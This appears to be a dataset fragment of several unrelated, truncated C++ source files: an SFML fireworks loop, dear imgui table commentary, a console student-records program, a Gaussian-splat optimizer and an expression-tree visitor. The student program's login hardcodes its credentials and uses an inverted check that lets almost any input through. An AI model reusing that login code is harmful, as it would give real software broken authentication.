}\n\n        window.clear();\n\n        if (!SpacePressed) {\n            static float fadeElapsedTime = 0.0f;\n            fadeElapsedTime += dt;\n\n            if (!Fireworks.empty()) { //if not empty we loop and continusely draw\n                for (size_t i = 0; i < Fireworks.size(); i++) {\n                    auto& current = Fireworks[i];\n\n                    current.Velocity.y += gravity * dt;\n\n                    if (current.Velocity.y > 0.0f) {\n                        createExplosion(FireWorksAftermath, current);\n\n                        Fireworks.erase(Fireworks.begin() + i);\n                        i--;\n                        continue;\n                    }\n\n                    current.Position += current.Velocity * dt;\n\n                    blastBoom.setRadius(current.Radius);\n                    blastBoom.setFillColor(current.Color);\n                    blastBoom.setOrigin(sf::Vector2f(current.Radius, current.Radius));\n                    blastBoom.setPosition(current.Position);\n\n                    fadeTexture.draw(blastBoom);\n                }\n            }\n\n            for (size_t i = 0; i < FireWorksAftermath.size(); i++) { // this is for the blast effect\n                auto& current = FireWorksAftermath[i];\n\n                current.Velocity.y += gravity * dt;\n\n                current.Position += current.Velocity * dt;\n\n                current.Radius -= 10.0f * dt;\n                if (current.Radius <= 1.0f) {\n                    FireWorksAftermath.erase(FireWorksAftermath.begin() + i);\n                    i--;\n                    continue;\n                }\n\n                blastBoom.setRadius(current.Radius);\n                blastBoom.setFillColor(current.Color);\n                blastBoom.setOrigin(sf::Vector2f(current.Radius, current.Radius));\n                blastBoom.setPosition(current.Position);\n\n                fadeTexture.draw(blastBoom);\n            }\n\n            fadeTexture.display();\n\n            window.draw(sf::Sprite(fadeTexture.getTexture()));\n        }\n\n        //this is for fps kinda whack imo\n        frameCount++;\n        if (fpsClock.getElapsedTime().asSeconds() >= 1.0f) {\n            float fps = static_cast<float>(frameCount) / fpsClock.restart().asSeconds();\n            fpsText.setString(\"FPS: \" + std::to_string(static_cast<int>(fps)));\n\n            frameCount = 0;\n        }\n        window.draw(fpsText);\n\n        window.display();\n\n",
    "// dear imgui, v1.90.7\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/",
    "//student management System.\r\n//all header files\r\n#include<iostream>\r\n#include<conio.h>\r\n#include<string.h>\r\n#include<iomanip>\r\n#include<windows.h>\r\n#include<fstream>\r\n#include<stdlib.h>\r\n#include<stdio.h>\r\nusing namespace std;\r\nclass student\r\n{\r\n    char name[30];\r\n    int Roll_no;\r\n    int age;\r\n    char Pname[30];\r\n    char stdn[10];\r\n    int busno;\r\n    string convert(string s)\r\n    {\r\n        for(int i=0;i<s.length();i++)\r\n        {\r\n            s[i]=toupper(s[i]);\r\n        }\r\n        return s;\r\n    }\r\npublic:\r\n    void intro(void);   // introduction of project.\r\n    void ccolor(int); //display colorful contain.\r\n    void loadingbar(void);   //simple loading bar.\r\n    void login(void); //simple login contain.\r\n    void getdata(void);   //Get all data from user.\r\n    void showdata(void);   //display all data .\r\n    void viewAlldata();     //display all data from files.\r\n    int storedata();        //store all data in a file\r\n    void searchData(char *);    //search a perticuler data.\r\n    void showsearch(void);      //display search.\r\n    void deleteData(char *);    //delete a data.\r\n    void updateData(char *);    //use to update a data.\r\n    student()\r\n    {\r\n        Roll_no=0;\r\n        age=0;\r\n        busno=0;\r\n        strcpy(name,\"no name\");\r\n        strcpy(Pname,\"no name\");\r\n        strcpy(stdn,\"not found\");\r\n    }\r\n\r\n};\r\nvoid student::ccolor(int clr){\r\n\tHANDLE  hConsole;\r\n\thConsole = GetStdHandle(STD_OUTPUT_HANDLE);\r\n\tSetConsoleTextAttribute(hConsole, clr);\r\n\r\n//the above code displays colorful background.\r\n}\r\nvoid student::loadingbar()\r\n{\r\n    for (int i=15;i<=100;i+=5)//increasing by  5 and start with 15\r\n        {\r\n        system(\"cls\");\r\n        ccolor(14);\r\n\t\tcout<<\"\\n\\n\\n\\n\\n\\n\\n\\t\\t\\t\";\r\n\t\tcout<<i<<\" %% Loading...\\n\\n\\t\\t\";\r\n\t\tcout<<\" \";\r\n\t\tfor (int j=0; j<i;j+=2){\r\n\t\t\tcout<<\" \";\r\n\t\t}\r\n\t\tSleep(50);  //sleep for 50 mile second\r\n\t\tif(i==90 || i==50 || i==96 || i==83){\r\n\t\t\tSleep(50);\r\n\t\t}\r\n\t}\r\n\tsystem(\"cls\");// clear the terminal\r\n}\r\nvoid student::intro()\r\n{\r\n    ccolor(433);\r\n    cout<<\"*****************************************************************\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"*************      STUDENT MONITORING SYSTEM       **************\"<<endl\r\n        <<\"*************             MADE BY MR.ASHFAQUE ALI      **********\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"*****************************************************************\"<<endl\r\n        <<\"_________________________________________________________________\\n\";\r\n        //simple introduction\r\n        getch();\r\n}\r\nvoid student::login()\r\n{\r\n    ccolor(14); // simple login with user_id and password\r\n    char ui[]=\"ASHFAQUE\";\r\n    char psw[]=\"3535\";\r\n    char gui[10],gpsw[10];\r\n    cout<<\"\\n\\t\\t______________________________\"<<endl\r\n        <<\"\\t\\t|ENTER USER ID:-|\";\r\n    cin>>gui;\r\n    cout<<\"\\n\\t\\t______________________________\"<<endl\r\n        <<\"\\t\\t|ENTER PASSWORD:-|\";\r\n    cin>>gpsw;\r\n    if(strcmp(ui,gui)!=0 && strcmp(psw,gpsw)==0)\r\n       {\r\n           ccolor(12);\r\n        cout<<\"\\t\\tINVALID UI AND PASSWORD:\";\r\n        getch();\r\n        exit(0);\r\n    }\r\n    else\r\n    {\r\n        cout<<\"\\t\\tLOGIN SUCSESSFULLY:-\\n\";\r\n    }\r\n}\r\nvoid student::getdata()\r\n{\r\n\r\n    fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT NAME :\";cin.getline(name,29);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT ROLL.NO :\";cin>>Roll_no;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT BUS NO :\";cin>>busno;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT AGE :\";cin>>age;fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;fflush(stdin);\r\n   cout<<\"\\t* ENTER STUDENT FATHER NAME :\";cin.getline(Pname,29);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;\r\n   cout<<\"\\t* ENTER STUDENT STANDARD :\";cin.getline(stdn,9);fflush(stdin);\r\n   cout<<\"\\t**************************************************\"<<endl;fflush(stdin);\r\n\r\n}\r\nvoid student::showdata()\r\n{\r\n            cout<<\"\\t***************************************************\"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|NAME of the student is       |->    \"<<name<<\"   \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|Roll.NO of the student is    |->       \"<<Roll_no<<\"          \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<endl;\r\n            cout<<\"\\t|BUS.NO of the student is     |->       \"<<busno<<\"         \"<<endl;\r\n            cout<<\"\\t|                             |                   \"<<",
    "\ufeff#include \"pr.hpp\"\n#include <iostream>\n#include <memory>\n\n#include <intrin.h>\n\n#define SPLAT_BOUNDS 3.0f\n#define MIN_THROUGHPUT ( 1.0f / 256.0f )\n\nuint32_t pcg(uint32_t v)\n{\n    uint32_t state = v * 747796405u + 2891336453u;\n    uint32_t word = ((state >> ((state >> 28u) + 4u)) ^ state) * 277803737u;\n    return (word >> 22u) ^ word;\n}\n\nglm::uvec3 pcg3d(glm::uvec3 v)\n{\n    v = v * 1664525u + 1013904223u;\n    v.x += v.y * v.z; v.y += v.z * v.x; v.z += v.x * v.y;\n    v ^= v >> 16u;\n    v.x += v.y * v.z; v.y += v.z * v.x; v.z += v.x * v.y;\n    return v;\n}\n\nglm::vec3 sign_of(glm::vec3 v)\n{\n    return {\n        v.x < 0.0f ? -1.0f : 1.0f,\n        v.y < 0.0f ? -1.0f : 1.0f,\n        v.z < 0.0f ? -1.0f : 1.0f\n    };\n}\nfloat sign_of(float v)\n{\n    return v < 0.0f ? -1.0f : 1.0f;\n}\ntemplate <class T>\ninline T ss_max( T x, T y )\n{\n\treturn ( x < y ) ? y : x;\n}\n\ntemplate <class T>\ninline T ss_min( T x, T y )\n{\n\treturn ( y < x ) ? y : x;\n}\nfloat exp_approx( float x )\n{\n\t//return expf( x ); // use this for numerical varidation\n\n\t/*\n\tfloat L = 0.0f;\n\tfloat R = 1.0f;\n\tfor (int i = 0 ; i < 1000 ; i++)\n\t{\n\t\tfloat m = ( L + R ) * 0.5f;\n\t\tfloat x = m;\n\t\tx *= x;\n\t\tx *= x;\n\t\tx *= x;\n\t\tif( x == 0.0f || fpclassify(x) == FP_SUBNORMAL )\n\t\t{\n\t\t\tL = m;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tR = m;\n\t\t}\n\t}\n\tprintf( \"%.32f\\n\", R ); >> 0.00001814586175896693021059036255\n\t*/\n\tx = 1.0f + x / 8.0f;\n\tif( x < 0.00001814586175896693021059036255f ) // avoid subnormal\n\t{\n\t\treturn 0.0f;\n\t}\n\tx *= x;\n\tx *= x;\n\tx *= x;\n\treturn x;\n}\n\nstruct Splat\n{\n    glm::vec2 pos;\n\tfloat sx;\n\tfloat sy;\n\tfloat rot;\n    glm::vec3 color;\n\tfloat opacity;\n};\n\n#define POS_PURB 0.1f\n#define RADIUS_PURB 0.1f\n#define COLOR_PURB 0.01f\n\n#define RADIUS_MAX 16.0f\n\nenum\n{\n    SIGNBIT_POS_X = 0,\n    SIGNBIT_POS_Y,\n    SIGNBIT_RADIUS,\n    SIGNBIT_COL_R,\n    SIGNBIT_COL_G,\n    SIGNBIT_COL_B,\n};\n\nbool bitAt(uint32_t u, uint32_t i)\n{\n    return u & (1u << i);\n}\n\n// 0: +1, 1: -1\nfloat signAt(uint32_t u, uint32_t i)\n{\n    return bitAt(u, i) ? -1.0f : 1.0f;\n}\n\nuint32_t splatRng(uint32_t i, uint32_t perturbIdx)\n{\n    return pcg(i + pcg(perturbIdx));\n}\n\nfloat lengthSquared(glm::vec2 v)\n{\n    return v.x * v.x + v.y * v.y;\n}\nfloat lengthSquared(glm::vec3 v)\n{\n    return v.x * v.x + v.y * v.y + v.z * v.z;\n}\n\nconst float ADAM_BETA1 = 0.9f;\nconst float ADAM_BETA2 = 0.99f;\n\nstruct Adam\n{\n    float m_m;\n    float m_v;\n\n    float optimize(float value, float g, float alpha, float beta1t, float beta2t)\n    {\n        float s = alpha;\n        float m = ADAM_BETA1 * m_m + (1.0f - ADAM_BETA1) * g;\n        float v = ADAM_BETA2 * m_v + (1.0f - ADAM_BETA2) * g * g;\n        m_m = m;\n        m_v = v;\n        float m_hat = m / (1.0f - beta1t);\n        float v_hat = v / (1.0f - beta2t);\n\n        const float ADAM_E = 1.0e-15f;\n        return value - s * m_hat / (sqrt(v_hat) + ADAM_E);\n    }\n};\nstruct SplatAdam\n{\n    Adam pos[2];\n\tAdam sx;\n\tAdam sy;\n\tAdam rot;\n    Adam color[3];\n\tAdam opacity;\n};\n\n\n\n// ax^2 + bx + c == 0\nint solve_quadratic( float xs[2], float a, float b, float c )\n{\n\tfloat det = b * b - 4.0f * a * c;\n\tif( det < 0.0f )\n\t{\n\t\treturn 0;\n\t}\n\n\tfloat k = ( -b - sign_of( b ) * std::sqrtf( det ) ) / 2.0f;\n\tfloat x0 = k / a;\n\tfloat x1 = c / k;\n\txs[0] = ss_min( x0, x1 );\n\txs[1] = ss_max( x0, x1 );\n\treturn 2;\n}\n\n// lambda0 is larger\nvoid eignValues( float* lambda0, float* lambda1, float* determinant, const glm::mat2& mat )\n{\n\tfloat mean = ( mat[0][0] + mat[1][1] ) * 0.5f;\n\tfloat det = mat[0][0] * mat[1][1] - mat[1][0] * mat[0][1];\n\tfloat d = std::sqrtf( ss_max( mean * mean - det, 0.0f ) );\n\t*lambda0 = mean + d;\n\t*lambda1 = mean - d;\n    *determinant = det;\n}\n\nglm::mat2 rot2d( float rad )\n{\n\tfloat cosTheta = std::cosf( rad );\n\tfloat sinTheta = std::sinf( rad );\n\treturn glm::mat2( cosTheta, sinTheta, -sinTheta, cosTheta );\n};\n\n// \\sigma = V * L * V^(-1)\nglm::mat2 cov_of( const Splat& splat )\n{\n\tfloat theta = splat.rot;\n\tfloat sx = splat.sx;\n\tfloat sy = splat.sy;\n\n\tfloat cosTheta = std::cosf( theta );\n\tfloat sinTheta = std::sinf( theta );\n\tfloat lambda0 = sx * sx;\n\tfloat lambda1 = sy * sy;\n\tfloat s11 = lambda0 * cosTheta * cosTheta + lambda1 * sinTheta * sinTheta;\n\tfloat s12 = ( lambda0 - lambda1 ) * sinTheta * cosTheta;\n\treturn glm::mat2(\n\t\ts11, s12,\n\t\ts12, lambda0 + lambda1 - s11 );\n}\n\nvoid eigen_vectors_of_cov( glm::vec2* eigen0, glm::vec2* eigen1, const glm::mat2& cov, float lambda0 /*larger*/ )\n{\n\tfloat s11 = cov[0][0];\n\tfloat s22 = cov[1][1];\n\tfloat s12 = cov[1][0];\n\n\tfloat eps = 1e-15f;\n\tglm::vec2 e0 = glm::normalize( s11 < s22 ? glm::vec2( s12 + eps, lambda0 - s11 ) : glm::vec2( lambda0 - s22, s12 + eps ) );\n\tglm::vec2 e1 = { -e0.y, e0.x };\n\t*eigen0 = e0;\n\t*eigen1 = e1;\n}\n\nint main() {\n    using namespace pr;\n\n    SetDataDir(ExecutableDir());\n\n    Config config;\n    config.ScreenWidth = 1920;\n    config.ScreenHeight = 1080;\n    config.SwapInterval = 0;\n    Initialize(config);\n\n    Camera3D camera;\n    camera.origin = { 0, 0, 200 };\n    camera.lookat = { 0, 0, 0 };\n\n    double e = GetElapsedTime();\n\n    ITexture* textureRef ",
    "\ufeff#include <iostream>\n#include <cassert>\n#include <string> \nusing namespace std;\n\nstruct Transformer;\nstruct Number;\nstruct BinaryOperation;\nstruct FunctionCall;\nstruct Variable;\n\nstruct Expression //\u0431\u0430\u0437\u043e\u0432\u0430\u044f \u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u0430\u044f \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430\n{\n\tvirtual ~Expression() { } //\u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\tvirtual double evaluate() const = 0; //\u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\tvirtual Expression* transform(Transformer* tr) const = 0;\n\tvirtual std::string print() const = 0;//\u0430\u0431\u0441\u0442\u0440\u0430\u043a\u0442\u043d\u044b\u0439 \u043c\u0435\u0442\u043e\u0434 \u043f\u0435\u0447\u0430\u0442\u044c\n};\n\nstruct Transformer //pattern Visitor\n{\n\tvirtual ~Transformer() {}\n\tvirtual Expression* transformNumber(Number const*) = 0;\n\tvirtual Expression* transformBinaryOperation(BinaryOperation const*) = 0;\n\tvirtual Expression* transformFunctionCall(FunctionCall const*) = 0;\n\tvirtual Expression* transformVariable(Variable const*) = 0;\n};\n\nstruct Number : Expression // \u0441\u0442\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u0427\u0438\u0441\u043b\u043e\u00bb\n{\n\tNumber(double value) : value_(value) {} //\u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n\tdouble value() const { return value_; } // \u043c\u0435\u0442\u043e\u0434 \u0447\u0442\u0435\u043d\u0438\u044f \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0447\u0438\u0441\u043b\u0430\n\tdouble evaluate() const { return value_; } // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t~Number() {}//\u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440, \u0442\u043e\u0436\u0435 \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u044b\u0439\n\tstd::string print() const { return std::to_string(this->value_); }\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformNumber(this);\n\t}\nprivate:\n\tdouble value_; // \u0441\u0430\u043c\u043e \u0432\u0435\u0449\u0435\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0447\u0438\u0441\u043b\u043e\n};\n\n\nstruct BinaryOperation : Expression // \u00ab\u0411\u0438\u043d\u0430\u0440\u043d\u0430\u044f \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u044f\u00bb\n{\n\tenum { // \u043f\u0435\u0440\u0435\u0447\u0438\u0441\u043b\u0438\u043c \u043a\u043e\u043d\u0441\u0442\u0430\u043d\u0442\u044b, \u043a\u043e\u0442\u043e\u0440\u044b\u043c\u0438 \u0437\u0430\u0448\u0438\u0444\u0440\u0443\u0435\u043c \u0441\u0438\u043c\u0432\u043e\u043b\u044b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0439\n\t\tPLUS = '+',\n\t\tMINUS = '-',\n\t\tDIV = '/',\n\t\tMUL = '*'\n\t};\n\t// \u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e \u0443\u043a\u0430\u0437\u0430\u0442\u044c 2 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430 \u2014 \u043b\u0435\u0432\u044b\u0439 \u0438 \u043f\u0440\u0430\u0432\u044b\u0439, \u0430 \u0442\u0430\u043a\u0436\u0435 \u0441\u0430\u043c \u0441\u0438\u043c\u0432\u043e\u043b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n\tBinaryOperation(Expression const* left, int op, Expression const* right) : left_(left), op_(op), right_(right)\n\t{\n\t\tassert(left_ && right_);\n\t}\n\t~BinaryOperation() //\u0432 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043e\u0441\u0432\u043e\u0431\u043e\u0434\u0438\u043c \u0437\u0430\u043d\u044f\u0442\u0443\u044e \u043f\u0430\u043c\u044f\u0442\u044c\n\t{\n\t\tdelete left_;\n\t\tdelete right_;\n\t}\n\tExpression const* left() const { return left_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u043b\u0435\u0432\u043e\u0433\u043e \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430\n\tExpression const* right() const { return right_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u043f\u0440\u0430\u0432\u043e\u0433\u043e \u043e\u043f\u0435\u0440\u0430\u043d\u0434\u0430\n\tint operation() const { return op_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n\tdouble evaluate() const // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t{\n\t\tdouble left = left_->evaluate(); // \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043b\u0435\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u044c\n\t\tdouble right = right_->evaluate(); // \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043f\u0440\u0430\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u044c\n\t\tswitch (op_) // \u0432 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 \u043e\u0442 \u0432\u0438\u0434\u0430 \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438, \u0441\u043a\u043b\u0430\u0434\u044b\u0432\u0430\u0435\u043c, \u0432\u044b\u0447\u0438\u0442\u0430\u0435\u043c, \u0443\u043c\u043d\u043e\u0436\u0430\u0435\u043c\n\t\t\t// \u0438\u043b\u0438 \u0434\u0435\u043b\u0438\u043c \u043b\u0435\u0432\u0443\u044e \u0438 \u043f\u0440\u0430\u0432\u0443\u044e \u0447\u0430\u0441\u0442\u0438\n\t\t{\n\t\tcase PLUS: return left + right;\n\t\tcase MINUS: return left - right;\n\t\tcase DIV: return left / right;\n\t\tcase MUL: return left * right;\n\t\t}\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformBinaryOperation(this);\n\t}\n\tstd::string print() const {\n\t\treturn this->left_->print() + std::string(1, this->op_) + this->right_->print();\n\t}\nprivate:\n\tExpression const* left_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043b\u0435\u0432\u044b\u0439 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\n\tExpression const* right_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u043f\u0440\u0430\u0432\u044b\u0439 \u043e\u043f\u0435\u0440\u0430\u043d\u0434\n\tint op_; // \u0441\u0438\u043c\u0432\u043e\u043b \u043e\u043f\u0435\u0440\u0430\u0446\u0438\u0438\n};\nstruct FunctionCall : Expression // \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u0412\u044b\u0437\u043e\u0432 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\u00bb\n{\n\t// \u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e \u0443\u0447\u0435\u0441\u0442\u044c \u0438\u043c\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0438 \u0435\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\n\tFunctionCall(std::string const& name, Expression const* arg) : name_(name),\n\t\targ_(arg)\n\t{\n\t\tassert(arg_);\n\t\tassert(name_ == \"sqrt\" || name_ == \"abs\");\n\t} // \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u043d\u044b \u0442\u043e\u043b\u044c\u043a\u043e \u0432\u044b\u0437\u043e\u0432 sqrt \u0438 abs\n\tstd::string const& name() const\n\t{\n\t\treturn name_;\n\t}\n\tExpression const* arg() const // \u0447\u0442\u0435\u043d\u0438\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n\t{\n\t\treturn arg_;\n\t}\n\t~FunctionCall() { delete arg_; } // \u043e\u0441\u0432\u043e\u0431\u043e\u0436\u0434\u0430\u0435\u043c \u043f\u0430\u043c\u044f\u0442\u044c \u0432 \u0434\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435\n\tvirtual double evaluate() const { // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430\n\t\t//\u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t\tif (name_ == \"sqrt\")\n\t\t\treturn sqrt(arg_->evaluate()); // \u043b\u0438\u0431\u043e \u0432\u044b\u0447\u0438\u0441\u043b\u044f\u0435\u043c \u043a\u043e\u0440\u0435\u043d\u044c \u043a\u0432\u0430\u0434\u0440\u0430\u0442\u043d\u044b\u0439\n\t\telse return fabs(arg_->evaluate());\n\t} // \u043b\u0438\u0431\u043e \u043c\u043e\u0434\u0443\u043b\u044c \u2014 \u043e\u0441\u0442\u0430\u043b\u044c\u043d\u044b\u0435 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n//\u0437\u0430\u043f\u0440\u0435\u0449\u0435\u043d\u044b\n\tstd::string print() const {\n\t\treturn this->name_ + \"(\" + this->arg_->print() + \")\";\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformFunctionCall(this);\n\t}\nprivate:\n\tstd::string const name_; // \u0438\u043c\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n\tExpression const* arg_; // \u0443\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0435\u0435 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\n};\nstruct Variable : Expression // \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0430 \u00ab\u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f\u00bb\n{\n\tVariable(std::string const& name) : name_(name) { } //\u0432 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0435 \u043d\u0430\u0434\u043e\n\t//\u0443\u043a\u0430\u0437\u0430\u0442\u044c \u0435\u0435 \u0438\u043c\u044f\n\tstd::string const& name() const { return name_; } // \u0447\u0442\u0435\u043d\u0438\u0435 \u0438\u043c\u0435\u043d\u0438 \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n\tdouble evaluate() const // \u0440\u0435\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f \u0432\u0438\u0440\u0442\u0443\u0430\u043b\u044c\u043d\u043e\u0433\u043e \u043c\u0435\u0442\u043e\u0434\u0430 \u00ab\u0432\u044b\u0447\u0438\u0441\u043b\u0438\u0442\u044c\u00bb\n\t{\n\t\treturn 0.0;\n\t}\n\tstd::string print() const {\n\t\treturn this->name_;\n\t}\n\tExpression* transform(Transformer* tr) const\n\t{\n\t\treturn tr->transformVariable(this);\n\t}\nprivate:\n\tstd::string const name_; // \u0438\u043c\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u043e\u0439\n};\n\n//\u0420\u0435\u0430\u043b\u0438\u0437\u043e\u0432\u0430\u043d \u043a\u043b\u0430\u0441\u0441 